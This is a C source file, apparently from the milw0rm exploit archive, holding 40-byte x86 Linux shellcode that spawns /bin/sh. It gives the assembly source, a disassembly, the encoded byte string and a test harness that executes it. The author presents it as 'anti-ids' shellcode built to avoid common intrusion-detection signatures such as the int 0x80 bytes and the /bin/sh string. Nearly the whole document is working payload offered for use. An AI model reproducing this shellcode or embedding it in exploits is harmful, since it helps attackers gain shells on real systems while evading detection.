/*
[N] Shell : shellcodez

Arch:x86
Platform:linux
Size:40
Description:
The shellcode to execute /bin/sh;
This shellcode is anti-ids
It not containz encoding engine but it
not contain standart signatures as:
	"\xcd\x80"
	'\bin\sh'
Tested on Slackware 10.0

Coded by [NicatiN]
http://nshell.h15.ru
n_shell@mail.ru


source:
cdq
push edx
pop eax
push edx
mov edi,876189623
add edi,edi
push edi
mov edi,884021143
add edi,edi
inc edi
push edi
mov ebx,esp
push edx
push ebx
mov ecx,esp
mov al,99
sub al,88
sub edi,1768009314
push edi
call esp

dizasm:
8048080:       99                      cltd
8048081:       52                      push   %edx
8048082:       58                      pop    %eax
8048083:       52                      push   %edx
8048084:       bf b7 97 39 34          mov    $0x343997b7,%edi
8048089:       01 ff                   add    %edi,%edi
804808b:       57                      push   %edi
804808c:       bf 97 17 b1 34          mov    $0x34b11797,%edi
8048091:       01 ff                   add    %edi,%edi
8048093:       47                      inc    %edi
8048094:       57                      push   %edi
8048095:       89 e3                   mov    %esp,%ebx
8048097:       52                      push   %edx
8048098:       53                      push   %ebx
8048099:       89 e1                   mov    %esp,%ecx
804809b:       b0 63                   mov    $0x63,%al
804809d:       2c 58                   sub    $0x58,%al
804809f:       81 ef 62 ae 61 69       sub    $0x6961ae62,%edi
80480a5:       57                      push   %edi
80480a6:       ff d4                   call   *%esp

*/

char sc[]=
"\x99\x52\x58\x52\xbf\xb7\x97\x39\x34\x01\xff\x57\xbf\x97\x17\xb1"
"\x34\x01\xff\x47\x57\x89\xe3\x52\x53\x89\xe1\xb0\x63\x2c\x58\x81"
"\xef\x62\xae\x61\x69\x57\xff\xd4";

int main()
{
	int (*f)() = (int (*)())sc;
	f();
}

// milw0rm.com [2006-01-26]